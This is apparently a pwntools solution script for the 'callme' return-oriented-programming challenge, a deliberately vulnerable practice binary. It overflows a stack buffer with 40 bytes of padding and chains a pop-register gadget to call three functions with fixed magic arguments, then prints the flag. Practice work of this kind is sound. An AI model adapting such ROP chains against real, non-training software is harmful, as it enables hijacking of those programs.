from pwn import * 

elf=ELF("callme")
r=ROP([elf])
p=process(elf.path)

ret = r.find_gadget(["ret"])[0]
pop_rdi_rsi_rdx=r.find_gadget(["pop rdi","pop rsi","pop rdx","ret"])[0]
deadbeaf=p64(0xdeadbeefdeadbeef)
cafebabe=p64(0xcafebabecafebabe)
d00df00d=p64(0xd00df00dd00df00d)

callme1=elf.sym.callme_one
callme2=elf.sym.callme_two
callme3=elf.sym.callme_three

##512 bytes limit
p.recvuntil(b'>')
parameters_set=p64(pop_rdi_rsi_rdx)+deadbeaf+cafebabe+d00df00d
payload=b'A'*40
payload+=parameters_set+p64(callme1)
payload+=parameters_set+p64(callme2)
payload+=parameters_set+p64(callme3)
p.send(payload)
print(p.recvuntil("}"))